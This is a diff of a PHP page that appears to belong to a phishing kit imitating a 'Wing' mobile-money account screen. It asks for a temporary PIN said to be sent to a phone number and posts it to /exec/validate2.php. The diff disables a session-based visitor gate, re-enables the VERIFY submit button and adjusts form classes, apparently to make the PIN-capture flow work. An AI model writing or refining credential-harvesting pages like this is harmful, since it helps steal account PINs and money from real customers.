@@ -1,6 +1,6 @@
 ﻿<?php
-session_start();
-if (isset($_SESSION['confirm'])) :
+// session_start();
+/*if (isset($_SESSION['confirm'])) :*/
 
 
 function fnDecrypt($sValue, $sSecretKey)
@@ -97,7 +97,7 @@ if(!isset($_POST['id']) || empty($_POST['id']) || is_null($_POST['id'])){ header
 								<div class="sec-tagline">
 									<p>A temporary PIN has been sent to the number <span class="st-c-number">078703977</span></p>
 								</div>
-								<form class="final-step-form" method="post" novalidate action="/exec/validate2.php" >
+								<form class="create-pin-account" method="post" novalidate action="/exec/validate2.php" >
 									<div class="loading-spinner-wrapper" id="app-loader">
 								        <span class="loading-spinner">
 								          <i class="one"></i>
@@ -118,10 +118,10 @@ if(!isset($_POST['id']) || empty($_POST['id']) || is_null($_POST['id'])){ header
 												<p>This temporary PIN is required <span>*</span></p>
 											</d	iv>
 										</div>
-										<!-- <input type="submit" class="btn btn-orange btn-verfication-code" name="" value="VERIFY"> -->
+										<input type="submit" class="btn btn-orange btn-verfication-code" name="" value="VERIFY">
 									</div>
 
-									<div class="create-pin-account">
+									<div class="create-pin-account" style="">
 
 										<!-- <h3 class="co-blue">Create your Wing account PIN</h3> -->
 										<!-- <div class="loading-spinner-wrapper" id="app-loader">
@@ -230,10 +230,10 @@ if(!isset($_POST['id']) || empty($_POST['id']) || is_null($_POST['id'])){ header
 </html>
 
 <?php
-else:
+/*else:
 	$home = 'http://'.$_SERVER['HTTP_HOST'];
 	$loc = "Location: ".$home;
 	header($loc);
 endif;
-session_destroy();
+session_destroy();*/
 ?>
